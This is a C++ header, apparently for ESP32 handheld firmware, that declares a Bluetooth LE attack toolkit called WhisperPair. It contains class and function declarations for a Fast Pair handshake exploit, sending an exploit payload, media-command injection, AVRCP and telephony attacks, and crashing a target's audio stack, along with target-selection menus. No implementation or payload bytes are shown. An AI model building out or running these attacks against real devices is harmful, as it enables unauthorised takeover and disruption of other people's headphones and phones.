#ifndef WHISPERPAIR_H
#define WHISPERPAIR_H

#include <NimBLEDevice.h>
#include "fastpair_crypto.h"
#include <WString.h>
#include <vector>

extern "C" {
#include "esp_heap_caps.h"
}

#ifndef TFT_WHITE
#define TFT_WHITE 0xFFFF
#endif

#ifndef TFT_BLACK
#define TFT_BLACK 0x0000
#endif

#ifndef TFT_RED
#define TFT_RED 0xF800
#endif

#ifndef TFT_GREEN
#define TFT_GREEN 0x07E0
#endif

#ifndef TFT_BLUE
#define TFT_BLUE 0x001F
#endif

#ifndef TFT_YELLOW
#define TFT_YELLOW 0xFFE0
#endif

#ifndef TFT_CYAN
#define TFT_CYAN 0x07FF
#endif

#ifndef TFT_MAGENTA
#define TFT_MAGENTA 0xF81F
#endif

#ifndef TFT_ORANGE
#define TFT_ORANGE 0xFDA0
#endif

#ifndef TFT_GRAY
#define TFT_GRAY 0x8410
#endif

class BLEAttackManager {
private:
    bool isInAttackMode = false;
    bool wasScanning = false;

public:
    void prepareForConnection();
    void cleanupAfterAttack();
    bool connectToDevice(NimBLEAddress target, NimBLEClient** outClient);
};

class WhisperPairExploit {
private:
    BLEAttackManager bleManager;
    FastPairCrypto crypto;

    NimBLERemoteCharacteristic* findKBPCharacteristic(NimBLERemoteService* fastpairService);
    bool performHandshake(NimBLERemoteCharacteristic* kbpChar);
    bool sendExploitPayload(NimBLERemoteCharacteristic* kbpChar);
    bool testForVulnerability(NimBLERemoteCharacteristic* kbpChar);

public:
    bool execute(NimBLEAddress target);
    bool executeSilent(NimBLEAddress target);
};

class AudioAttackService {
public:
    bool findAndAttackAudioServices(NimBLEClient* pClient);
    bool attackAVRCP(NimBLERemoteService* avrcpService);
    bool attackAudioMedia(NimBLERemoteService* mediaService);
    bool attackTelephony(NimBLERemoteService* teleService);
    bool executeAudioAttack(NimBLEAddress target);
    bool injectMediaCommands(NimBLEAddress target);
    bool crashAudioStack(NimBLEAddress target);
};

class AudioCommandService {
private:
    NimBLEServer* pServer;
    NimBLEService* pAudioService;
    NimBLECharacteristic* pCmdCharacteristic;
    bool isConnected;

public:
    AudioCommandService();
    void start();
    void stop();
    void injectCommand(const uint8_t* cmd, size_t len);
    bool isDeviceConnected();
};

bool safeConnectWithRetry(NimBLEAddress target, int maxRetries, NimBLEClient** outClient);
int8_t showAdaptiveMessage(const char* line1, const char* btn1, const char* btn2, const char* btn3, uint16_t color, bool showEscHint, bool autoProgress);
void showWarningMessage(const char* message);
void showErrorMessage(const char* message);
void showSuccessMessage(const char* message);
void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, uint16_t bgColor, uint16_t textColor);
NimBLEAddress parseAddress(const String& addressInfo);
String selectTargetFromScan(const char* title);
bool requireSimpleConfirmation(const char* message);
void showAttackResult(bool success, const char* message = nullptr);
bool confirmAttack(const char* targetName);
void runWhisperPairAttack(NimBLEAddress target);
void runAudioStackCrash(NimBLEAddress target);
void runMediaCommandHijack(NimBLEAddress target);
void runQuickTest(NimBLEAddress target);
void audioCommandHijackTest();
void whisperPairMenu();
void showAttackProgress(const char* message, uint16_t color = TFT_WHITE);

#endif